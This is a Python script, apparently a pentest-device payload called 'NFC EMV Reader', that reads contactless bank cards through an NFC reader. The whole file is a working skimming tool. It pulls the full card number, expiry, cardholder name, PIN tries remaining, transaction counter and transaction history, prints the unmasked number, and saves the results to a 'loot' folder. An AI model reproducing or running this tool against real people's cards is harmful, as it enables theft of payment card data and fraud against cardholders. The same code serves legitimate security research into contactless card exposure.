#!/usr/bin/env python3
# @name: NFC EMV Reader
# @desc: Read contactless bank cards (Visa, Mastercard, CB, Amex, etc.).
# @category: nfc_rfid
# @danger: true
# @active: true
# @web: true
"""
RaspyJack Payload -- NFC EMV Reader
=====================================
Read contactless bank cards (Visa, Mastercard, CB, Amex, etc.).
Extracts: card number, expiry, name, country, currency, CVM,
transaction counter, PIN tries, and transaction history.

Controls:
  Usage: nfc_emv.py

  Prompts for card placement, reads and parses the EMV application(s),
  and prints card info, details, CVM methods and transaction history to
  stdout. Prompts to save the result to loot and to scan another card.
  Press Ctrl-C at any time to stop.
"""

from payloads._web_input import request_input
import os
import sys
import time
import json
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

from payloads.nfc_rfid._nfc_driver import auto_detect

LOOT_DIR = os.path.join(os.environ.get("CITYPOP_ROOT", os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))), 'loot', 'NFC', 'emv')

KNOWN_AIDS = [
    ("Visa", "A0000000031010"),
    ("Visa Electron", "A0000000032010"),
    ("Mastercard", "A0000000041010"),
    ("Maestro", "A0000000043060"),
    ("CB", "A0000000421010"),
    ("Amex", "A00000002501"),
    ("JCB", "A0000000651010"),
    ("Discover", "A0000001523010"),
    ("UnionPay", "A000000333010101"),
    ("Mir", "A0000006581010"),
    ("Interac", "A0000002771010"),
]

CURRENCY_CODES = {
    "0978": "EUR", "0840": "USD", "0826": "GBP", "0756": "CHF",
    "0124": "CAD", "0392": "JPY", "0036": "AUD", "0156": "CNY",
    "0985": "PLN", "0643": "RUB", "0946": "RON", "0203": "CZK",
    "0348": "HUF", "0752": "SEK", "0578": "NOK", "0208": "DKK",
    "0986": "BRL", "0484": "MXN", "0949": "TRY", "0410": "KRW",
}

COUNTRY_CODES = {
    "0250": "France", "0840": "USA", "0826": "UK", "0276": "Germany",
    "0380": "Italy", "0724": "Spain", "0056": "Belgium", "0756": "Switzerland",
    "0124": "Canada", "0392": "Japan", "0036": "Australia", "0616": "Poland",
    "0528": "Netherlands", "0620": "Portugal", "0040": "Austria",
}

CVM_METHODS = {
    0x00: "Fail CVM", 0x01: "Plaintext PIN offline", 0x02: "Enciphered PIN online",
    0x03: "Plaintext PIN offline + sign", 0x04: "Enciphered PIN offline",
    0x1E: "Signature", 0x1F: "No CVM required",
    0x20: "Contactless - No CVM", 0x3F: "No CVM required",
}


def _prompt(msg):
    try:
        return request_input(msg).strip()
    except EOFError:
        return ""


def _parse_tlv(data: bytes) -> list:
    results = []
    i = 0
    while i < len(data):
        b = data[i]
        if b in (0x00, 0xFF):
            i += 1
            continue
        tag = b
        i += 1
        if (b & 0x1F) == 0x1F:
            if i >= len(data):
                break
            tag = (tag << 8) | data[i]
            i += 1
            while i < len(data) and data[i - 1] & 0x80:
                tag = (tag << 8) | data[i]
                i += 1
        if i >= len(data):
            break
        length = data[i]
        i += 1
        if length == 0x81:
            if i >= len(data):
                break
            length = data[i]
            i += 1
        elif length == 0x82:
            if i + 1 >= len(data):
                break
            length = (data[i] << 8) | data[i + 1]
            i += 2
        elif length > 0x82:
            break
        if i + length > len(data):
            length = len(data) - i
        value = data[i:i + length]
        i += length
        if b & 0x20:
            results.extend(_parse_tlv(value))
        else:
            results.append((tag, value))
    return results


def _format_pan(raw: bytes) -> str:
    hex_str = raw.hex().upper()
    if "D" in hex_str:
        pan = hex_str.split("D")[0]
    elif "F" in hex_str:
        pan = hex_str.rstrip("F")
    else:
        pan = hex_str
    return " ".join(pan[i:i+4] for i in range(0, len(pan), 4))


def _mask_pan(pan: str) -> str:
    digits = pan.replace(" ", "")
    if len(digits) <= 8:
        return pan
    return digits[:4] + " **** **** " + digits[-4:]


def _format_expiry(raw: bytes) -> str:
    h = raw.hex()
    if len(h) >= 4:
        return f"{h[2:4]}/20{h[0:2]}"
    return h


def _format_name(raw: bytes) -> str:
    name = raw.decode("ascii", errors="replace").strip()
    if "/" in name:
        parts = name.split("/")
        return f"{parts[1].strip()} {parts[0].strip()}"
    return name


def _parse_cvm_list(raw: bytes) -> list:
    methods = []
    if len(raw) < 8:
        return methods
    for i in range(8, len(raw), 2):
        if i + 1 >= len(raw):
            break
        code = raw[i] & 0x3F
        cond = raw[i + 1]
        name = CVM_METHODS.get(code, f"Method 0x{code:02X}")
        cond_str = ""
        if cond == 0x00:
            cond_str = "always"
        elif cond == 0x03:
            cond_str = "if terminal supports"
        elif cond == 0x06:
            cond_str = "if < floor limit"
        elif cond == 0x08:
            cond_str = "if > CVM limit"
        elif cond == 0x09:
            cond_str = "if > floor limit"
        methods.append(f"{name} ({cond_str})" if cond_str else name)
    return methods


def _get_data(drv, tag_hi, tag_lo):
    """GET DATA command for a specific tag."""
    apdu = bytes([0x80, 0xCA, tag_hi, tag_lo, 0x00])
    return drv.data_exchange(apdu)


def _read_tx_log(drv, sfi, max_records=20):
    """Read transaction log records from a given SFI."""
    transactions = []
    for rec in range(1, max_records + 1):
        p2 = (sfi << 3) | 0x04
        resp = drv.data_exchange(bytes([0x00, 0xB2, rec, p2, 0x00]))
        if not resp or len(resp) < 4:
            break
        transactions.append(resp)
    return transactions


def _parse_tx_record(raw: bytes, log_format: bytes) -> dict:
    """Parse a transaction record using the log format template."""
    tx = {}
    tlvs = _parse_tlv(log_format) if log_format else []
    offset = 0
    for tag, length_hint in tlvs:
        ln = len(length_hint)
        if offset + ln > len(raw):
            break
        val = raw[offset:offset + ln]
        offset += ln
        if tag == 0x9A:
            tx["date"] = f"20{val[0]:02x}/{val[1]:02x}/{val[2]:02x}"
        elif tag == 0x9F21:
            tx["time"] = f"{val[0]:02x}:{val[1]:02x}:{val[2]:02x}"
        elif tag in (0x9F02, 0x81):
            amount = int(val.hex())
            tx["amount"] = f"{amount / 100:.2f}"
        elif tag == 0x5F2A:
            code = val.hex().lstrip("0") or "0"
            tx["currency"] = CURRENCY_CODES.get(val.hex(), code)
        elif tag == 0x9F1A:
            code = val.hex()
            tx["country"] = COUNTRY_CODES.get(code, code)
        elif tag == 0x9C:
            tx["type"] = "Purchase" if val[0] == 0x00 else "Cash" if val[0] == 0x01 else f"0x{val[0]:02x}"
    # Fallback: raw parse if no log format
    if not tx and len(raw) >= 10:
        tx["raw"] = raw.hex()
    return tx


def _read_emv(drv):
    result = {
        "pan": "", "expiry": "", "effective": "", "name": "",
        "pan_seq": "", "country": "", "currency": "", "language": "",
        "app_version": "", "atc": "", "pin_tries": "",
        "service_code": "", "cvm": [],
        "apps": [], "transactions": [], "raw_tags": {},
    }

    # SELECT PPSE
    ppse = bytes.fromhex("00A404000E325041592E5359532E444446303100")
    resp = drv.data_exchange(ppse)
    if not resp or len(resp) < 4:
        return None

    for tag, val in _parse_tlv(resp):
        if tag == 0x4F:
            for name, known_aid in KNOWN_AIDS:
                if val.hex().upper().startswith(known_aid.upper()):
                    result["apps"].append({"name": name, "aid": val.hex().upper()})
                    break

    # Try each AID
    for aid_name, aid in KNOWN_AIDS:
        aid_bytes = bytes.fromhex(aid)
        apdu = bytes.fromhex("00A40400") + bytes([len(aid_bytes)]) + aid_bytes + b"\x00"
        resp = drv.data_exchange(apdu)
        if not resp or len(resp) <= 2:
            continue

        app_info = {"name": aid_name, "aid": aid}
        for tag, val in _parse_tlv(resp):
            result["raw_tags"][f"0x{tag:X}"] = val.hex()
            if tag == 0x50:
                app_info["label"] = val.decode("ascii", errors="replace")
            elif tag == 0x9F12:
                app_info["preferred_name"] = val.decode("ascii", errors="replace")
            elif tag == 0x5F2D:
                result["language"] = val.decode("ascii", errors="replace")
            elif tag == 0x9F08:
                result["app_version"] = f"{val[0]}.{val[1]}" if len(val) >= 2 else val.hex()
            elif tag == 0x9F4D:
                # Log Entry: SFI + max records
                if len(val) >= 2:
                    app_info["log_sfi"] = val[0]
                    app_info["log_max"] = val[1]

        found = False
        for a in result["apps"]:
            if a.get("aid") == aid:
                a.update(app_info)
                found = True
        if not found and ("label" in app_info or "preferred_name" in app_info):
            result["apps"].append(app_info)

        # GET PROCESSING OPTIONS
        gpo = bytes.fromhex("80A8000002830000")
        gpo_resp = drv.data_exchange(gpo)
        if not gpo_resp:
            continue

        afl_data = b""
        for tag, val in _parse_tlv(gpo_resp):
            result["raw_tags"][f"0x{tag:X}"] = val.hex()
            if tag == 0x94:
                afl_data = val

        # READ RECORDS from AFL
        sfis_to_read = []
        if afl_data:
            for i in range(0, len(afl_data), 4):
                if i + 3 >= len(afl_data):
                    break
                sfi = (afl_data[i] >> 3) & 0x1F
                first = afl_data[i + 1]
                last = afl_data[i + 2]
                for rec in range(first, last + 1):
                    sfis_to_read.append((sfi, rec))
        else:
            for sfi in [1, 2, 3]:
                for rec in [1, 2, 3]:
                    sfis_to_read.append((sfi, rec))

        for sfi, rec in sfis_to_read:
            p2 = (sfi << 3) | 0x04
            rr = drv.data_exchange(bytes([0x00, 0xB2, rec, p2, 0x00]))
            if not rr or len(rr) <= 2:
                continue
            for tag, val in _parse_tlv(rr):
                result["raw_tags"][f"0x{tag:X}"] = val.hex()
                if tag == 0x57:
                    pan = _format_pan(val)
                    if len(pan.replace(" ", "")) >= 12:
                        result["pan"] = pan
                    h = val.hex().upper()
                    d_idx = h.find("D")
                    if d_idx > 0 and d_idx + 4 < len(h):
                        result["expiry"] = f"{h[d_idx+3:d_idx+5]}/20{h[d_idx+1:d_idx+3]}"
                        if d_idx + 7 <= len(h):
                            result["service_code"] = h[d_idx+5:d_idx+8]
                elif tag == 0x5A:
                    if not result["pan"]:
                        result["pan"] = _format_pan(val)
                elif tag == 0x5F24:
                    if not result["expiry"]:
                        result["expiry"] = _format_expiry(val)
                elif tag == 0x5F25:
                    result["effective"] = _format_expiry(val)
                elif tag == 0x5F20:
                    result["name"] = _format_name(val)
                elif tag == 0x5F28:
                    code = val.hex()
                    result["country"] = COUNTRY_CODES.get(code, code)
                elif tag == 0x5F34:
                    result["pan_seq"] = str(int(val.hex()))
                elif tag == 0x9F42:
                    code = val.hex()
                    result["currency"] = CURRENCY_CODES.get(code, code)
                elif tag == 0x8E:
                    result["cvm"] = _parse_cvm_list(val)

        # GET DATA: ATC (Application Transaction Counter)
        atc_resp = _get_data(drv, 0x9F, 0x36)
        if atc_resp and len(atc_resp) >= 2:
            for tag, val in _parse_tlv(atc_resp):
                if tag == 0x9F36:
                    result["atc"] = str(int(val.hex(), 16))

        # GET DATA: PIN Try Counter
        pin_resp = _get_data(drv, 0x9F, 0x17)
        if pin_resp and len(pin_resp) >= 2:
            for tag, val in _parse_tlv(pin_resp):
                if tag == 0x9F17:
                    result["pin_tries"] = str(val[0])

        # GET DATA: Log Format
        log_format = b""
        log_resp = _get_data(drv, 0x9F, 0x4F)
        if log_resp:
            for tag, val in _parse_tlv(log_resp):
                if tag == 0x9F4F:
                    log_format = val

        # Read transaction log
        log_sfi = app_info.get("log_sfi")
        if log_sfi:
            raw_txs = _read_tx_log(drv, log_sfi, app_info.get("log_max", 10))
            for raw in raw_txs:
                tx = _parse_tx_record(raw, log_format)
                if tx:
                    result["transactions"].append(tx)

        if result["pan"]:
            break

    return result if (result["pan"] or result["apps"]) else None


def _save_emv(data: dict) -> str:
    os.makedirs(LOOT_DIR, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    pan_short = data["pan"].replace(" ", "")[-4:] if data["pan"] else "unknown"
    fname = f"emv_{pan_short}_{ts}.json"
    with open(os.path.join(LOOT_DIR, fname), "w") as f:
        json.dump({**data, "timestamp": ts}, f, indent=2)
    return fname


def _print_emv(card_data):
    app_name = ""
    for app in card_data.get("apps", []):
        app_name = app.get("label") or app.get("preferred_name") or app.get("name", "")
        if app_name:
            break
    if app_name:
        print(f"Application: {app_name}", flush=True)

    pan = card_data["pan"].replace(" ", "")
    display_pan = " ".join(pan[i:i + 4] for i in range(0, len(pan), 4))
    print(f"PAN: {display_pan}", flush=True)

    if card_data.get("expiry"):
        print(f"Exp: {card_data['expiry']}", flush=True)
    if card_data.get("name"):
        print(f"Name: {card_data['name']}", flush=True)
    if card_data.get("country") or card_data.get("currency"):
        parts = []
        if card_data["country"]:
            parts.append(card_data["country"])
        if card_data["currency"]:
            parts.append(card_data["currency"])
        print(" - ".join(parts), flush=True)

    if card_data.get("atc"):
        print(f"Transaction counter: {card_data['atc']}", flush=True)
    if card_data.get("pin_tries"):
        print(f"PIN tries remaining: {card_data['pin_tries']}", flush=True)
    if card_data.get("effective"):
        print(f"Active since: {card_data['effective']}", flush=True)
    if card_data.get("service_code"):
        print(f"Service code: {card_data['service_code']}", flush=True)
    if card_data.get("language"):
        print(f"Language: {card_data['language']}", flush=True)

    if card_data.get("cvm"):
        print("Verification methods:", flush=True)
        for m in card_data["cvm"]:
            print(f"  {m}", flush=True)

    txs = card_data.get("transactions", [])
    if txs:
        print("Transaction history:", flush=True)
        for tx in txs:
            date = tx.get("date", "")
            amount = tx.get("amount", "?")
            curr = tx.get("currency", "")
            country = tx.get("country", "")
            line = f"  {date} {amount}{curr}"
            if country:
                line += f" {country}"
            print(line, flush=True)


def main():
    print("Detecting reader...", flush=True)
    drv, drv_desc = auto_detect()
    print(f"Reader: {drv_desc}", flush=True)

    try:
        while True:
            if not drv:
                print("No NFC reader connected.", flush=True)
                choice = _prompt("Retry detection? [y/N, q to quit]: ").lower()
                if choice == "q" or choice != "y":
                    break
                drv, drv_desc = auto_detect()
                print(f"Reader: {drv_desc}", flush=True)
                continue

            _prompt("Place card on reader, then press Enter (Ctrl-C to quit)...")
            print("Polling...", flush=True)
            card = drv.read_passive_target(timeout=8.0)
            card_data = None
            if card:
                print("Reading...", flush=True)
                card_data = _read_emv(drv)
                if card_data and card_data.get("pan"):
                    _print_emv(card_data)
                else:
                    card_data = None
                    print("Not a bank card.", flush=True)
            else:
                print("No card detected.", flush=True)

            if card_data:
                choice = _prompt("Save to loot? [y/N]: ").lower()
                if choice == "y":
                    fname = _save_emv(card_data)
                    print(f"Saved: {os.path.join(LOOT_DIR, fname)}", flush=True)

            choice = _prompt("Scan another card? [y/N]: ").lower()
            if choice != "y":
                break
    except KeyboardInterrupt:
        print("\nStopped by user.", flush=True)
    finally:
        if drv:
            drv.close()

    print("Exiting.", flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
